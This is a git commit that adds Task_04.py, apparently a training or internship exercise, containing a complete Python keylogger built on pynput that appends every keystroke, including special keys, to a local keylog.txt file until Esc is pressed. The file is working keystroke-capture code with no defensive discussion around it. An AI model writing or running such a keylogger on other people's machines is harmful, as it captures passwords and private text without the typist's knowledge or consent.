8e68faef0635e0ca45fe4fbd8e28b47322c9fbb9
Vishant Kumar <vishantdhiran@gmail.com>
2024-07-27 16:53:02 +0530

    Add files via upload

---
+++ Task_04.py
@@ -0,0 +1,31 @@
+from pynput import keyboard
+
+# File to save the keystrokes
+log_file = "keylog.txt"
+
+# This function is called whenever a key is pressed
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        # Handle special keys
+        if key == keyboard.Key.space:
+            with open(log_file, "a") as f:
+                f.write(" ")
+        elif key == keyboard.Key.enter:
+            with open(log_file, "a") as f:
+                f.write("\n")
+        else:
+            with open(log_file, "a") as f:
+                f.write(f"{key}")
+
+# This function is called when a key is released
+def on_release(key):
+    # Stop listener
+    if key == keyboard.Key.esc:
+        return False
+
+# Collect events until released
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
